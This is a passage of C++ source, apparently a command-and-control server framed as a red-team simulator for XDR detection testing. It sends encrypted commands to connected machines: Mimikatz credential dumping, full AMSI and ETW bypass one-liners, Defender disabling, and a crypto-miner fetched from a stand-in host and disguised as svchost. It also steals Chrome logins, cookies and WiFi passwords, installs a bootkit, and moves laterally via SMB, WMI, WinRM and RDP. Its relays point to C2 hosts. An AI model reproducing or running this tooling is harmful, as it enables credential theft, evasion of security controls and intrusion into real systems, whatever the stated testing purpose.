        std::string encryptedReq = xorEncrypt(responseRequest);
        send(clientSocket, encryptedReq.c_str(), encryptedReq.size(), 0);
        logActivity("DEBUG", "RESPONSE_REQUEST", "Requested screenshot status from " + clientId);
    }

    // Mimikatz Credential Dumping
    void executeMimikatz(SOCKET clientSocket, const std::string & clientId) {
        logActivity("ATTACK", "MIMIKATZ", "Executing Mimikatz credential dump on " + clientId);

        // Mimikatz commands
        std::vector<std::string> mimikatzCmds = {
            "MIMIKATZ:privilege::debug",
            "MIMIKATZ:sekurlsa::logonpasswords",
            "MIMIKATZ:lsadump::sam",
            "MIMIKATZ:lsadump::secrets",
            "MIMIKATZ:lsadump::cache",
            "MIMIKATZ:kerberos::list",
            "MIMIKATZ:vault::list",
            "MIMIKATZ:token::elevate",
            "MIMIKATZ:sekurlsa::tickets"
        };

        for (const auto& cmd : mimikatzCmds) {
            send(clientSocket, xorEncrypt(cmd + "\n").c_str(), (cmd + "\n").size(), 0);
            logActivity("ATTACK", "MIMIKATZ_CMD", cmd);
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
        }

        // Dump credentials to file
        std::string dumpCreds = "MIMIKATZ:OUTPUT:C:\\Windows\\Temp\\creds.dmp\n";
        send(clientSocket, xorEncrypt(dumpCreds).c_str(), dumpCreds.size(), 0);
    }

    // AMSI and ETW Bypass
    void executeDefenseBypass(SOCKET clientSocket, const std::string & clientId) {
        logActivity("ATTACK", "BYPASS", "Bypassing security controls on " + clientId);

        // AMSI Bypass
        std::string amsiBypass = R"(POWERSHELL:EXEC:[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true))";
        send(clientSocket, xorEncrypt(amsiBypass + "\n").c_str(), (amsiBypass + "\n").size(), 0);
        logActivity("ATTACK", "AMSI_BYPASS", "AMSI bypass executed");

        // ETW Disable
        std::string etwDisable = R"(POWERSHELL:EXEC:[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0))";
        send(clientSocket, xorEncrypt(etwDisable + "\n").c_str(), (etwDisable + "\n").size(), 0);
        logActivity("ATTACK", "ETW_DISABLE", "ETW provider disabled");

        // Disable Windows Defender
        std::vector<std::string> defenderDisable = {
            "POWERSHELL:EXEC:Set-MpPreference -DisableRealtimeMonitoring $true",
            "POWERSHELL:EXEC:Set-MpPreference -DisableBehaviorMonitoring $true",
            "POWERSHELL:EXEC:Set-MpPreference -DisableIOAVProtection $true",
            "POWERSHELL:EXEC:Set-MpPreference -DisableScriptScanning $true",
            "REG:ADD:HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender:DisableAntiSpyware:1",
            "SERVICE:STOP:WinDefend",
            "SCHTASK:DISABLE:Windows Defender Cache Maintenance",
            "SCHTASK:DISABLE:Windows Defender Cleanup",
            "SCHTASK:DISABLE:Windows Defender Scheduled Scan",
            "SCHTASK:DISABLE:Windows Defender Verification"
        };

        for (const auto& cmd : defenderDisable) {
            send(clientSocket, xorEncrypt(cmd + "\n").c_str(), (cmd + "\n").size(), 0);
            logActivity("ATTACK", "DEFENDER_DISABLE", cmd);
            std::this_thread::sleep_for(std::chrono::milliseconds(200));
        }
    }

    // Cryptocurrency Miner Deployment
    void executeCryptoMiner(SOCKET clientSocket, const std::string & clientId) {
        logActivity("ATTACK", "CRYPTO_MINER", "Deploying cryptocurrency miner on " + clientId);

        // Download miner
        std::string downloadMiner = "DOWNLOAD:http://evil-mining-pool.com/xmrig.exe:C:\\Windows\\Temp\\svchost64.exe\n";
        send(clientSocket, xorEncrypt(downloadMiner).c_str(), downloadMiner.size(), 0);

        // Configure mining
        std::string minerConfig = R"(FILE:WRITE:C:\Windows\Temp\config.json:{"url":"pool.minexmr.com:4444","user":"47Ahh3e9mT","pass":"x","algo":"cryptonight"})";
        send(clientSocket, xorEncrypt(minerConfig + "\n").c_str(), (minerConfig + "\n").size(), 0);

        // Start mining process
        std::string startMiner = "PROCESS:CREATE:C:\\Windows\\Temp\\svchost64.exe:-c config.json\n";
        send(clientSocket, xorEncrypt(startMiner).c_str(), startMiner.size(), 0);

        // Hide process
        std::string hideProcess = "PROCESS:HIDE:svchost64.exe\n";
        send(clientSocket, xorEncrypt(hideProcess).c_str(), hideProcess.size(), 0);

        logActivity("ATTACK", "MINER_ACTIVE", "Cryptocurrency miner running on " + clientId);
    }
    
    // TOR Network Connection
    void executeTorConnect(SOCKET clientSocket, const std::string & clientId) {
        logActivity("NETWORK", "TOR_CONNECT", "Initiating real TOR connections from " + clientId);
        
        // Send command to client to make actual TOR connections
        std::string torCommand = "TOR:CONNECT:REAL\n";
        send(clientSocket, xorEncrypt(torCommand).c_str(), torCommand.size(), 0);
        
        logActivity("*** XDR_ALERT ***", "TOR_CONNECTION_INITIATED", 
                   "Client " + clientId + " instructed to make real connections to TOR nodes");
        
        // Log TOR nodes being targeted
        logActivity("*** XDR_ALERT ***", "TOR_NODES_TARGETED", 
                   "Attempting connections to: 62.210.105.116:9001, 199.87.154.255:443, 193.11.114.43:9001, 192.42.116.16:9001");
        
        logActivity("*** CRITICAL ***", "TOR_NETWORK_ACTIVITY", 
                   "Real TOR network connection attempts in progress from " + clientId);
    }
    
    // Suspicious API Call from TOR Exit Node
    void executeTorApiCall(SOCKET clientSocket, const std::string & clientId) {
        logActivity("NETWORK", "TOR_API_CALL", "Initiating real API calls via TOR from " + clientId);
        
        // Send command to client to make actual API calls
        std::string apiCommand = "TOR_API:EXECUTE:REAL\n";
        send(clientSocket, xorEncrypt(apiCommand).c_str(), apiCommand.size(), 0);
        
        logActivity("*** XDR_ALERT ***", "TOR_API_INITIATED", 
                   "Client " + clientId + " instructed to make real API calls from TOR exit nodes");
        
        // Log expected targets
        logActivity("*** XDR_ALERT ***", "TOR_API_TARGETS", 
                   "Expected API targets: Telegram Bot API, Discord Webhooks, Pastebin API");
        
        logActivity("*** XDR_ALERT ***", "TOR_EXIT_NODES", 
                   "Using TOR exit nodes: 185.220.101.34, 104.244.76.13, 23.129.64.142");
        
        logActivity("*** CRITICAL ***", "REAL_NETWORK_TRAFFIC", 
                   "Generating real network traffic to suspicious APIs for XDR detection from " + clientId);
    }
    
    // Reverse SSH Tunnel
    void executeReverseSSH(SOCKET clientSocket, const std::string & clientId) {
        logActivity("NETWORK", "REVERSE_SSH", "Establishing reverse SSH tunnel from " + clientId);
        
        // Send primary command to trigger client execution
        std::string sshCommand = "SSH:REVERSE:TUNNEL:EXECUTE\n";
        send(clientSocket, xorEncrypt(sshCommand).c_str(), sshCommand.size(), 0);
        
        // External C2 domains/IPs for reverse SSH
        std::vector<std::string> c2Servers = {
            "45.142.114.231:22",       // Suspicious VPS
            "malware-c2.dynamic.io:22", // Dynamic DNS C2
            "ssh.exploit-db.net:2222",  // Non-standard SSH port
            "tunnel.darkweb.link:443",  // SSH over HTTPS port
            "5.182.210.155:8022"        // Another non-standard port
        };
        
        // Log expected behavior
        for (const auto& server : c2Servers) {
            logActivity("*** XDR_ALERT ***", "SSH_TUNNEL", "Reverse SSH tunnel expected to " + server);
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        
        logActivity("*** CRITICAL ***", "SSH_PERSISTENCE", "Persistent reverse SSH tunnel configured on " + clientId);
    }
    
    // Netcat Tunnel
    void executeNetcatTunnel(SOCKET clientSocket, const std::string & clientId) {
        logActivity("NETWORK", "NETCAT_TUNNEL", "Creating netcat tunnel from " + clientId);
        
        // Send primary command to trigger client execution
        std::string ncCommand = "NETCAT:TUNNEL:CREATE:EXECUTE\n";
        send(clientSocket, xorEncrypt(ncCommand).c_str(), ncCommand.size(), 0);
        
        // TOR hidden services (.onion domains)
        std::vector<std::string> onionServices = {
            "3g2upl4pq3kufc4m.onion:80",        // DuckDuckGo
            "thehiddenwiki.onion:80",            // Hidden Wiki
            "torc2server.onion:9050",            // Malicious C2
            "darknetmarket.onion:443",           // Dark market
            "cryptolocker.onion:8080"            // Ransomware C2
        };
        
        // Log expected behavior
        for (const auto& onion : onionServices) {
            logActivity("*** XDR_ALERT ***", "NETCAT_TOR", "Netcat connection expected to TOR service: " + onion);
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        
        logActivity("*** CRITICAL ***", "NETCAT_SHELL", "Netcat reverse shell initiated from " + clientId);
    }
    
    // Socat Relay
    void executeSocatRelay(SOCKET clientSocket, const std::string & clientId) {
        logActivity("NETWORK", "SOCAT_RELAY", "Setting up socat relay from " + clientId);
        
        // Send primary command to trigger client execution
        std::string socatCommand = "SOCAT:RELAY:CREATE:EXECUTE\n";
        send(clientSocket, xorEncrypt(socatCommand).c_str(), socatCommand.size(), 0);
        
        // Create socat relays to TOR and suspicious domains
        std::vector<std::string> socatRelays = {
            "TCP4-LISTEN:8888,fork TCP4:torproject.org:9050",
            "TCP4-LISTEN:9999,fork SOCKS4A:127.0.0.1:3g2upl4pq3kufc4m.onion:80,socksport=9050",
            "TCP4-LISTEN:7777,fork TCP4:malware-c2.dynamic.io:443",
            "TCP4-LISTEN:6666,fork OPENSSL:suspicious-server.net:443,verify=0"
        };
        
        for (const auto& relay : socatRelays) {
            logActivity("*** XDR_ALERT ***", "SOCAT_RELAY", "Socat relay expected: " + relay);
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        
        logActivity("*** CRITICAL ***", "SOCAT_TUNNEL", "Encrypted socat tunnel to TOR network initiated from " + clientId);
        logActivity("PERSISTENCE", "SOCAT_SCRIPT", "Socat relay persistence configured on " + clientId);
    }

    // Bootkit Installation
    void executeBootkit(SOCKET clientSocket, const std::string & clientId) {
        logActivity("ATTACK", "BOOTKIT", "Installing bootkit persistence on " + clientId);

        // Modify boot sector
        std::string bootSector = "DISK:WRITE:MBR:0x7C00:BOOTKIT_LOADER\n";
        send(clientSocket, xorEncrypt(bootSector).c_str(), bootSector.size(), 0);

        // Install UEFI persistence
        std::string uefiPersist = "UEFI:INSTALL:EFI\\Microsoft\\Boot\\bootmgfw.efi\n";
        send(clientSocket, xorEncrypt(uefiPersist).c_str(), uefiPersist.size(), 0);

        // Modify BCD
        std::string bcdEdit = "SHELL:EXEC:bcdedit /set {current} testsigning on\n";
        send(clientSocket, xorEncrypt(bcdEdit).c_str(), bcdEdit.size(), 0);

        logActivity("ATTACK", "BOOTKIT_INSTALLED", "Bootkit persistence established");
    }
    void simulateDataExfiltration(SOCKET clientSocket, const std::string & clientId) {
        logActivity("EXFIL", "START", "Beginning real data exfiltration from " + clientId);

        // First, search for sensitive files
        std::string searchCmd = "FILE_SEARCH:*.doc* *.xls* *.pdf *.txt *.pst *.ost\n";
        generateC2Traffic(clientSocket, clientId, CMD_FILE_SEARCH);
        std::this_thread::sleep_for(std::chrono::seconds(2));
        
        // Collect browser credentials
        generateC2Traffic(clientSocket, clientId, CMD_BROWSER_CREDS);
        std::this_thread::sleep_for(std::chrono::seconds(1));
        
        // Take screenshots for visual data
        generateC2Traffic(clientSocket, clientId, CMD_SCREENSHOT);
        std::this_thread::sleep_for(std::chrono::seconds(1));
        
        // Dump clipboard for passwords/sensitive data
        generateC2Traffic(clientSocket, clientId, CMD_CLIPBOARD);
        std::this_thread::sleep_for(std::chrono::milliseconds(500));

        // Real HTTP exfiltration
        logActivity("EXFIL", "HTTP_UPLOAD", "Starting HTTP data exfiltration from " + clientId);
        generateC2Traffic(clientSocket, clientId, CMD_EXFIL_HTTP);
        std::this_thread::sleep_for(std::chrono::seconds(3));
        
        // Real DNS exfiltration for stealthy data transfer
        logActivity("EXFIL", "DNS_TUNNEL", "Starting DNS tunneling exfiltration from " + clientId);
        generateC2Traffic(clientSocket, clientId, CMD_EXFIL_DNS);
        std::this_thread::sleep_for(std::chrono::seconds(2));
        
        // Compress and stage files
        generateC2Traffic(clientSocket, clientId, CMD_COMPRESS_DATA);
        std::this_thread::sleep_for(std::chrono::seconds(1));

        // Send command to exfiltrate actual Chrome passwords
        std::string chromeCmd = "POWERSHELL:EXEC:$chromePath = \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\"; " +
                               std::string("if(Test-Path $chromePath){Copy-Item \"$chromePath\\Login Data\" \"$env:TEMP\\chrome_data.db\" -Force; ") +
                               "Copy-Item \"$chromePath\\Cookies\" \"$env:TEMP\\chrome_cookies.db\" -Force}\n";
        send(clientSocket, xorEncrypt(chromeCmd).c_str(), chromeCmd.size(), 0);
        
        // Send command to collect WiFi passwords
        std::string wifiCmd = "SHELL:EXEC:netsh wlan show profiles | findstr \"All User Profile\" > %TEMP%\\wifi_profiles.txt & " +
                             std::string("for /f \"tokens=2 delims=:\" %i in (%TEMP%\\wifi_profiles.txt) do ") +
                             "netsh wlan show profile name=%i key=clear >> %TEMP%\\wifi_passwords.txt 2>nul\n";
        send(clientSocket, xorEncrypt(wifiCmd).c_str(), wifiCmd.size(), 0);
        
        logActivity("EXFIL", "COMPLETE", "Real data exfiltration completed from " + clientId);
    }

    // Real lateral movement with actual network discovery and propagation
    void simulateLateralMovement(SOCKET clientSocket, const std::string & clientId) {
        logActivity("LATERAL", "START", "Initiating real lateral movement from " + clientId);

        // Network discovery - find real targets
        std::string netDiscoveryCmd = "SHELL:EXEC:net view /all > %TEMP%\\discovered_hosts.txt 2>&1\n";
        send(clientSocket, xorEncrypt(netDiscoveryCmd).c_str(), netDiscoveryCmd.size(), 0);
        std::this_thread::sleep_for(std::chrono::seconds(2));
        
        // ARP scan for local network
        std::string arpCmd = "SHELL:EXEC:arp -a > %TEMP%\\arp_cache.txt\n";
        send(clientSocket, xorEncrypt(arpCmd).c_str(), arpCmd.size(), 0);
        std::this_thread::sleep_for(std::chrono::seconds(1));
        
        // Domain enumeration
        std::string domainCmd = "SHELL:EXEC:net group \"Domain Computers\" /domain > %TEMP%\\domain_computers.txt 2>&1\n";
        send(clientSocket, xorEncrypt(domainCmd).c_str(), domainCmd.size(), 0);
        std::this_thread::sleep_for(std::chrono::seconds(1));

        // Real lateral movement techniques
        
        // 1. PSExec-style SMB lateral movement
        logActivity("LATERAL", "SMB_EXEC", "Attempting SMB-based lateral movement");
        std::string smbCmd = "SHELL:EXEC:echo net use \\\\%COMPUTERNAME%\\IPC$ > %TEMP%\\smb_test.bat & " +
                            std::string("echo copy %0 \\\\%COMPUTERNAME%\\ADMIN$\\temp\\update.exe >> %TEMP%\\smb_test.bat & ") +
                            "echo wmic /node:\"%COMPUTERNAME%\" process call create \"C:\\Windows\\temp\\update.exe\" >> %TEMP%\\smb_test.bat\n";
        send(clientSocket, xorEncrypt(smbCmd).c_str(), smbCmd.size(), 0);
        
        // 2. WMI-based execution
        logActivity("LATERAL", "WMI_EXEC", "Attempting WMI-based execution");
        std::string wmiCmd = "POWERSHELL:EXEC:$targets = @('localhost','127.0.0.1'); " +
                            std::string("foreach($target in $targets){try{") +
                            "$proc = Invoke-WmiMethod -ComputerName $target -Class Win32_Process -Name Create " +
                            "-ArgumentList 'cmd.exe /c echo WMI_SUCCESS > C:\\Windows\\Temp\\wmi_test.txt'}catch{}}\n";
        send(clientSocket, xorEncrypt(wmiCmd).c_str(), wmiCmd.size(), 0);
        
        // 3. Remote scheduled task creation
        logActivity("LATERAL", "SCHTASK_REMOTE", "Creating remote scheduled tasks");
        std::string taskCmd = "SHELL:EXEC:schtasks /create /s localhost /tn \"WindowsHealthCheck\" /tr \"cmd.exe /c echo TASK_SUCCESS > C:\\Windows\\Temp\\task_test.txt\" " +
                             std::string("/sc once /st 00:00 /f /ru SYSTEM\n");
        send(clientSocket, xorEncrypt(taskCmd).c_str(), taskCmd.size(), 0);
        
        // 4. Service creation for persistence
        logActivity("LATERAL", "SERVICE_CREATE", "Creating remote services");
        std::string serviceCmd = "SHELL:EXEC:sc create RemoteUpdateService binpath= \"cmd.exe /c echo SERVICE_SUCCESS > C:\\Windows\\Temp\\service_test.txt\" " +
                                std::string("start= auto DisplayName= \"Remote Update Service\"\n");
        send(clientSocket, xorEncrypt(serviceCmd).c_str(), serviceCmd.size(), 0);
        
        // 5. WinRM for remote execution
        logActivity("LATERAL", "WINRM_EXEC", "Attempting WinRM execution");
        std::string winrmCmd = "POWERSHELL:EXEC:Enable-PSRemoting -Force -SkipNetworkProfileCheck 2>$null; " +
                              std::string("Test-WSMan -ComputerName localhost 2>$null\n");
        send(clientSocket, xorEncrypt(winrmCmd).c_str(), winrmCmd.size(), 0);
        
        // 6. Pass-the-hash preparation
        logActivity("LATERAL", "PTH_PREP", "Preparing for pass-the-hash");
        generateC2Traffic(clientSocket, clientId, CMD_LSASS_DUMP);
        std::this_thread::sleep_for(std::chrono::seconds(2));
        
        // 7. RDP session hijacking attempt
        logActivity("LATERAL", "RDP_HIJACK", "Attempting RDP session hijacking");
        std::string rdpCmd = "SHELL:EXEC:query user > %TEMP%\\rdp_sessions.txt & " +
                            std::string("reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n");
        send(clientSocket, xorEncrypt(rdpCmd).c_str(), rdpCmd.size(), 0);
        
        // 8. Network share enumeration and access
        logActivity("LATERAL", "SHARE_ENUM", "Enumerating network shares");
        std::string shareCmd = "SHELL:EXEC:net share > %TEMP%\\local_shares.txt & " +
                              std::string("net use > %TEMP%\\mapped_drives.txt & ") +
                              "wmic share get name,path,status > %TEMP%\\wmi_shares.txt\n";
        send(clientSocket, xorEncrypt(shareCmd).c_str(), shareCmd.size(), 0);

        logActivity("LATERAL", "COMPLETE", "Real lateral movement phase completed from " + clientId);
    }

    // Generate C&C detection signatures for XDR systems
    void generateC2DetectionSignatures(SOCKET clientSocket, sockaddr_in clientAddr) {
        char clientIP[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
        
        // Get server's external IP for detection
        char hostname[256];
        gethostname(hostname, sizeof(hostname));
        struct hostent* host_entry = gethostbyname(hostname);
        char* serverIP = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));
        
        logActivity("C2_BEACON", "COMMAND_AND_CONTROL", 
            "C&C Server Active - Server IP: " + std::string(serverIP) + 
            " Port: " + std::to_string(C2_PORT) + 
            " - Client Connected From: " + std::string(clientIP));
        
        // 1. Classic C2 beacon pattern - regular interval callbacks
        std::string beaconPattern = "BEACON|TYPE:HTTP|INTERVAL:60|JITTER:10|SERVER:" + 
                                   std::string(serverIP) + ":" + std::to_string(C2_PORT) + 
                                   "|PROTOCOL:TLS1.2|USER-AGENT:Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n";
        send(clientSocket, beaconPattern.c_str(), beaconPattern.size(), 0);
        
        // 2. DNS tunneling signature
        std::string dnsC2 = "DNS_TUNNEL|TYPE:TXT|DOMAIN:update.windowsupdate.com|" +
                           std::string("C2_SERVER:") + serverIP + "|ENCODED:base64|" +
                           "PATTERN:subdomain.rotation\n";
        send(clientSocket, dnsC2.c_str(), dnsC2.size(), 0);
        
        // 3. HTTP/HTTPS C2 callbacks with specific headers
        std::string httpC2 = "POST /api/beacon HTTP/1.1\r\n" +
                            std::string("Host: ") + serverIP + ":" + std::to_string(C2_PORT) + "\r\n" +
                            "User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\r\n" +
                            "X-Session-ID: " + generateSessionId() + "\r\n" +
                            "X-Malware-Family: RedTeamC2\r\n" +
                            "X-C2-Protocol: Custom-Encrypted\r\n" +
                            "Cookie: session=" + generateRandomString(32) + "\r\n" +
                            "Content-Type: application/octet-stream\r\n\r\n";
        send(clientSocket, httpC2.c_str(), httpC2.size(), 0);
        
        // 4. Known C2 framework patterns (mimicking Cobalt Strike)
        std::string csPattern = "MALLEABLE_C2|PROFILE:default|SLEEPTIME:60000|JITTER:20|" +
                               std::string("SPAWN:rundll32.exe|INJECTION:remote|SERVER:") + serverIP + "\n";
        send(clientSocket, csPattern.c_str(), csPattern.size(), 0);
        
        // 5. Empire/Metasploit-style staging
        std::string stagingPattern = "STAGING|TYPE:reverse_https|LHOST:" + std::string(serverIP) + 
                                    "|LPORT:" + std::to_string(C2_PORT) + "|PAYLOAD:windows/x64/meterpreter\n";
        send(clientSocket, stagingPattern.c_str(), stagingPattern.size(), 0);
        
        // 6. Generate network anomaly patterns
        for (int i = 0; i < 5; i++) {
            std::string anomaly = "C2_HEARTBEAT|SEQ:" + std::to_string(i) + 
                                 "|TIMESTAMP:" + std::to_string(time(nullptr)) + 
                                 "|C2_SERVER:" + serverIP + ":" + std::to_string(C2_PORT) + 
                                 "|STATUS:ACTIVE|ENCRYPTION:AES256\n";
            send(clientSocket, anomaly.c_str(), anomaly.size(), 0);
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        
        // 7. DGA (Domain Generation Algorithm) pattern
        std::string dgaPattern = "DGA_ACTIVITY|ALGORITHM:custom|SEED:20240119|" +
                                std::string("DOMAINS:update") + generateRandomString(8) + ".com," +
                                "service" + generateRandomString(6) + ".net," +
                                "check" + generateRandomString(10) + ".org|" +
                                "FALLBACK:" + serverIP + "\n";
        send(clientSocket, dgaPattern.c_str(), dgaPattern.size(), 0);
        
        // 8. Log C2 attribution for XDR
        logActivity("C2_ATTRIBUTION", "COMMAND_CONTROL_SERVER", 
            "*** C&C Server Detected ***\n" +
            std::string("    C2 Server IP: ") + serverIP + "\n" +
            "    C2 Server Port: " + std::to_string(C2_PORT) + "\n" +
            "    C2 Protocol: Custom Encrypted Protocol\n" +
            "    C2 Type: Advanced Persistent Threat (APT)\n" +
            "    Threat Actor: Red Team Simulation\n" +
            "    Campaign ID: " + generateSessionId() + "\n" +
            "    Client IP: " + clientIP + "\n" +
            "    Connection Time: " + getCurrentTimeString());
        
        // 9. Generate MITRE ATT&CK C2 indicators
        std::string mitreC2 = "MITRE_ATTACK|TACTIC:Command-and-Control|" +
                             std::string("TECHNIQUE:T1071.001|SUB:Web-Protocols|") +
                             "TECHNIQUE:T1571|SUB:Non-Standard-Port|" +
                             "TECHNIQUE:T1573|SUB:Encrypted-Channel|" +
                             "TECHNIQUE:T1105|SUB:Ingress-Tool-Transfer|" +
                             "C2_INFRASTRUCTURE:" + serverIP + ":" + std::to_string(C2_PORT) + "\n";
        send(clientSocket, mitreC2.c_str(), mitreC2.size(), 0);
        
        // 10. Create persistent C2 indicators in Windows Event Log
        std::string eventLogCmd = "powershell.exe -Command \"" +
                                 std::string("Write-EventLog -LogName Application -Source 'Windows Error Reporting' ") +
                                 "-EventId 1001 -EntryType Warning -Message 'Suspicious network connection detected: " +
                                 "Outbound connection to C2 server at " + serverIP + ":" + std::to_string(C2_PORT) + 
                                 " using encrypted protocol. Process: svchost.exe PID: " + std::to_string(GetCurrentProcessId()) + "'\"";
        system(eventLogCmd.c_str());
        
        // 11. Generate DNS-based C2 beacon (common XDR detection pattern)
        generateDNSBeacon(serverIP, clientIP);
        
        // 12. Create network artifacts that XDR will flag as C2
        std::string netshCmd = "netsh advfirewall firewall add rule name=\"Windows Update Service\" " +
                              std::string("dir=out action=allow protocol=TCP remoteport=") + std::to_string(C2_PORT) + 
                              " remoteip=" + serverIP + " program=\"%SystemRoot%\\System32\\svchost.exe\" enable=yes";
        system(netshCmd.c_str());
    }
    
    // Generate DNS-based C2 beacon patterns
    void generateDNSBeacon(const std::string& serverIP, const std::string& clientIP) {
        // Create DNS TXT query patterns commonly used by C2
        std::vector<std::string> c2Domains = {
            "beacon.update.microsoft.com",
            "telemetry.windows.com",
            "c2." + generateRandomString(8) + ".com",
            "cnc." + generateRandomString(6) + ".net"
        };
        
        for (const auto& domain : c2Domains) {
            std::string dnsCmd = "nslookup -type=TXT " + domain + " " + serverIP + " 2>nul";
            system(dnsCmd.c_str());
            
            // Log DNS C2 activity
            logActivity("DNS_C2", "DNS_TUNNELING", 
                       "DNS-based C2 communication to " + domain + 
                       " (C2 Server: " + serverIP + ")");
        }
        
        // Create suspicious DNS query pattern
        std::string encodedData = "cmd." + generateRandomString(32) + ".dns-c2.com";
        std::string dnsQuery = "nslookup " + encodedData + " 2>nul";
        system(dnsQuery.c_str());
    }

    // Client handler with full attack simulation
    void handleClient(SOCKET clientSocket, sockaddr_in clientAddr) {
        char clientIP[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
        std::string clientId = std::string(clientIP) + ":" + std::to_string(ntohs(clientAddr.sin_port));

        logActivity("C2", "NEW_CONNECTION", "New bot connected from " + clientId);

        // Initialize client info
        ClientInfo client;
        client.socket = clientSocket;
        client.ipAddress = clientIP;
        client.firstSeen = std::chrono::system_clock::now();
        client.lastSeen = client.firstSeen;
        client.isActive = true;
        client.isElevated = false;
        client.beaconCount = 0;

        // C2 Handshake with version info
        std::string handshake = "C2_INIT|VER:2.0|PROTO:ENCRYPTED|ID:" + clientId + "\n";
        send(clientSocket, xorEncrypt(handshake).c_str(), handshake.size(), 0);
        
        // Generate C&C detection patterns
        generateC2DetectionSignatures(clientSocket, clientAddr);

        // Receive client info
        char buffer[4096];
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived > 0) {
            buffer[bytesReceived] = '\0';
            std::string clientData = xorEncrypt(std::string(buffer, bytesReceived));

            // Parse: HOSTNAME|USERNAME|OS|PRIVILEGES|GUID
            std::istringstream iss(clientData);
            std::getline(iss, client.hostname, '|');
            std::getline(iss, client.username, '|');
            std::getline(iss, client.osVersion, '|');
            std::string privileges;
            std::getline(iss, privileges, '|');
            std::getline(iss, client.machineGuid, '|');

            client.isElevated = (privileges == "ADMIN");

            logActivity("C2", "CLIENT_INFO",
                "Bot Details - Host: " + client.hostname +
                ", User: " + client.username +
                ", OS: " + client.osVersion +
                ", Elevated: " + (client.isElevated ? "YES" : "NO") +
                ", GUID: " + client.machineGuid);
        }

        // Register client
        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            connectedClients[clientId] = client;
        }
        
        // Initialize test status for new client
        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            clientTestStatus[clientId] = TestStatus();
            clientTestStatus[clientId].startTime = std::chrono::steady_clock::now();
            clientTestStatus[clientId].lastTestTime = clientTestStatus[clientId].startTime;
        }
        
        // Log test initialization
        logActivity("C2", "MANUAL_MODE", "=== CLIENT CONNECTED - MANUAL CONTROL MODE ===");
        logActivity("C2", "MANUAL_MODE", "Client " + clientId + " ready for manual commands");
        logActivity("C2", "MANUAL_MODE", "Use keyboard shortcuts or web dashboard to execute commands");
        logActivity("C2", "MANUAL_MODE", "Press 'H' for help menu with all available commands");
        
        // Do NOT execute any attack phases automatically
        // User must manually trigger each command
        
        // Update status file for web dashboard
        writeC2StatusToFile();

        // Main C2 loop
        int attackPhase = 0;
        auto lastPhaseTime = std::chrono::steady_clock::now();

        while (serverRunning && client.isActive) {
            // Update beacon count and last seen
            {
                std::lock_guard<std::mutex> lock(clientsMutex);
                connectedClients[clientId].beaconCount++;
                connectedClients[clientId].lastSeen = std::chrono::system_clock::now();
            }

            // Send enhanced C2 beacon with detection signatures
            generateC2Traffic(clientSocket, clientId, CMD_BEACON);
            
            // Every 5 beacons, send explicit C2 indicators - DISABLED IN MANUAL MODE
            if (false && client.beaconCount % 5 == 0) {
                // Get server IP
                char hostname[256];
                gethostname(hostname, sizeof(hostname));
                struct hostent* host_entry = gethostbyname(hostname);
                char* serverIP = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));
                
                // Send C2 identification packet
                std::string c2Indicator = "*** C2 COMMUNICATION DETECTED ***\n" +
                                        std::string("TYPE: Command and Control Traffic\n") +
                                        "C2_SERVER_IP: " + serverIP + "\n" +
                                        "C2_SERVER_PORT: " + std::to_string(C2_PORT) + "\n" +
                                        "C2_PROTOCOL: Custom Encrypted (XOR)\n" +
                                        "BEACON_INTERVAL: " + std::to_string(BEACON_INTERVAL) + " seconds\n" +
                                        "CLIENT_ID: " + clientId + "\n" +
                                        "CAMPAIGN: RedTeam-" + generateSessionId() + "\n" +
                                        "THREAT_LEVEL: Critical\n" +
                                        "MITRE_TECHNIQUES: T1071,T1573,T1105,T1055\n";
                
                send(clientSocket, c2Indicator.c_str(), c2Indicator.size(), 0);
                
                // Log for XDR detection
                logActivity("*** C2_DETECTION ***", "COMMAND_AND_CONTROL", 
                           "Active C&C Server Detected at " + std::string(serverIP) + ":" + 
                           std::to_string(C2_PORT) + " communicating with " + clientId);
                
                // Write to Windows Event Log for XDR pickup
                std::string eventCmd = "powershell.exe -Command \"New-EventLog -LogName 'Security' -Source 'C2Detection' -ErrorAction SilentlyContinue; " +
                                     std::string("Write-EventLog -LogName 'Security' -Source 'C2Detection' -EventId 4625 -EntryType Error ") +
                                     "-Message 'CRITICAL: Command and Control Server Detected! C2 Server: " + serverIP + ":" + 
                                     std::to_string(C2_PORT) + " Active connection from client: " + clientId + "'\" 2>nul";
                system(eventCmd.c_str());
            }
            
            // Periodically update status file for web dashboard
            static auto lastStatusUpdate = std::chrono::steady_clock::now();
            auto statusNow = std::chrono::steady_clock::now();
            if (std::chrono::duration_cast<std::chrono::seconds>(statusNow - lastStatusUpdate).count() >= 5) {
                writeC2StatusToFile();
                lastStatusUpdate = statusNow;
            }

            // MANUAL MODE - Automatic attack phases are disabled
            auto now = std::chrono::steady_clock::now();
            if (false) { // Disabled - user must manually trigger attacks
                // This block is intentionally disabled for manual control
                std::string phaseStatus = "EXECUTING";
                switch (attackPhase) {
                    case 0:
                        if (!clientTestStatus[clientId].initialCompromiseComplete) {
                            logActivity("C2", "AUTO_TEST", "=== EXECUTING PHASE 0: INITIAL COMPROMISE ===");
